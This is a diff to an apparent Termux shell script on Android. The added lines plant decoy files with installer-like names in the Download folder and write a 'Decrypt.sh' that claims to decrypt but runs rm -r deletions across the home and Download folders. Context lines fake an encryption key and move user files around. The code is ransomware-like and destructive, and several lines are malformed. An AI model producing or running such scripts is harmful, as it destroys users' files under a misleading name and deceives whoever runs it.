@@ -38,6 +38,42 @@ cd /sdcard
 echo "HUFCHf38384ifuJjtkRjgjfj28483">Encrypted.Encrypted
 mv /sdcard/*.Encrypted /$HOME
 clear
+cd /sdcard/Download
+cd /sdcard/download
+echo "tree">Python3.py
+echo "tree">Python2.py
+echo "tree">InstallerPy.py
+ "tree">PythonPip2.sh
+echo "tree">PythonPip.sh
+echo "tree">InstalleraShell.sh
+ "tree">Note.css
+echo "tree">Help.css
+echo "tree">Data.css
+echo "cd $HOME
+rm -r *.sh
+rm -r *.py
+rm -r *.txt
+rm -r *.Encrypted
+cd /sdcard/Encrypted
+ls
+mv * /$HOME
+ls
+cd /sdcard
+rm -r Encrypted
+cd /$HOME
+tree
+ls
+clear
+ls
+tree
+ls
+clear
+cd /sdcard/Download
+rm -r *.sh
+rm -r *.py
+rm -r  *.css
+cd /sdcard/Download
+rm -r Decrypt.sh">Decrypt.sh
 cd /$HOME
 echo "pip lolcat
 pkg install python
